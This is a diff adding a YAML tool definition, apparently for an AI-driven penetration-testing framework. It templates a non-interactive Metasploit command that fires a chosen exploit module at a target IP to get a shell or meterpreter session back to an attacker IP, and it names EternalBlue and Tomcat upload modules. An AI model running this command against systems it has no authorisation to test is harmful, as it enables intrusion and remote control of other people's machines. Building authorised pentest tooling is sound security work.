@@ -1,0 +1,19 @@
+name: metasploit
+category: shell
+description: Metasploit Framework exploit execution
+preconditions:
+  - has_target
+parameters:
+  module: from_finding.exploit_module
+  target_ip: from_engagement.target_ip
+  lhost: from_engagement.attacker_ip
+command_template: "msfconsole -q -x 'use {module}; set RHOSTS {target_ip}; set LHOST {lhost}; exploit'"
+parser: null
+expected_effects:
+  - shell_obtained
+  - meterpreter_session
+falsifier:
+  pattern: "Exploit completed, but no session|failed"
+  timeout: 120
+model_tier: haiku
+mechanism: "Modular exploit framework. Key modules: exploit/multi/handler (listener), exploit/windows/smb/ms17_010_eternalblue, exploit/multi/http/tomcat_mgr_upload. Use search <keyword> to find modules. Meterpreter provides advanced post-exploitation."
